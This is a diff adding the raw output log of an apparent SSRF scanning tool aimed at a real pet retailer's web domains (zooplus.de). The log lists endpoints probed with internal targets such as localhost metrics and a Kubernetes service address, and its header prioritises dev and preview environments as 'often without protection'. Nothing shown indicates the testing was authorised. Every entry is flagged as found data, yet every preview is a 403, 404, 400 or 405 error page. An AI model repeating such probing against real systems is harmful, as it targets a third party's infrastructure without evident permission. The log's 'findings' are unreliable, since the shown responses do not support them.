@@ -1,0 +1,5584 @@
+================================================================================
+ПРОВЕРКА SSRF НА ВСЕХ ПОДДОМЕНАХ ZOOPLUS
+================================================================================
+
+[*] Будет протестировано:
+    Поддомены: 17
+    Endpoints: 9
+    Test URLs: 3
+    Всего комбинаций: 459
+
+[*] ПРИОРИТЕТ: dev/beta/preview окружения (часто без защиты!)
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 400
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 400
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://kubernetes.default.svc/version
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://httpbin.org/ip
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
